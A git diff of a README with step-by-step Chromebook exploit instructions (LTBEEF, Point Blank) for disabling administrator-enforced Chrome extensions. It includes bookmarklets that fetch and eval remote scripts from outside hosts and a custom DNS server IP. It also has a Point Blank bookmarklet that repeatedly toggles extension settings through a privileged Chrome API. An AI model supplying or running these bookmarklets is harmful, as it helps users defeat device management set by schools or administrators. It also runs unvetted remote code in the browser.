@@ -20,9 +20,13 @@ There are several vesions of thisexploit you can use, here are the 2 most common
 - *Bookmarklets*  
     To use a GUI, bookmark one of the below scripts:  
     - Ingot  
-    ```javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())```
+    ```js
+    javascript:(function () {var a = document.createElement('script');a.src = 'https://cdn.jsdelivr.net/gh/FogNetwork/Ingot/ingot.min.js';document.body.appendChild(a);}())
+    ```
     - Compact Cow's UI  
-    ```javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});```  
+    ```js
+    javascript:fetch(`https://compactcow.com/ltbeef/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+    ```  
 
     Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. Simple!  
 
@@ -34,21 +38,32 @@ There are several vesions of thisexploit you can use, here are the 2 most common
     By changing your DNS server, you can use LTBEEF, even if bookmarklets are blocked.  
       
     First, go to Settings > Network > Wifi > Network, and click on "Custom Name Servers"
-    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)
+    ![image](https://user-images.githubusercontent.com/88395302/212482302-82334f42-c421-45c2-b210-1e700652b5be.png)  
     Set every box there to the following ip:  
     ```158.101.114.159``` (Hosted by The Greatest Giant#0110)  
     Navigate to <a href="https://chrome.google.com/webstorex">https://chrome.google.com/webstorex</a> and click on that bookmark. Flip the switches on the extentions you want to disable. 
 </details>  
 
 <details>
-<summary><b>SH1mmer</b></summary>
+<summary><b>Point Blank</b></summary>
+Point Blank is an exploit that allows you to run bookmarklets on privilaged pages, sutch as the chrome extentions page.  
+This exploit was also found by Bypassi, you can read more about how he discovered this exploit <a href="https://blog.bypassi.com/_/point-blank/"></a>
 
-
+1. Bookmark this code:
+```js
+javascript:let shim = false;var ids = prompt("extension ids (comma separated)").split(",");setInterval(()=>{ids.forEach((id)=> opener.chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: shim}));shim = !shim;}, 125);
+```
+2. Navigate to `chrome://extensions` 
+3. Click on a extension that YOU installed from the Chrome Web Store > Details
+4. In the URL bar, copy the string of letters and numbers after the `/?id=`
+5. Click "View in Chrome Web Store" and spam the excape key. If it loads into chrome webstore try again, if it is a blank screen click the bookmarklet
+5. Paste the id of the extension into the prompt. 
+If you close the tab, the exploit will stop working.
 </details>
 
 <details>
-<summary><b>Point Blank</b></summary>
-Point Blank
+<summary><b>SH1mmer</b></summary>
+
 
 </details>
 
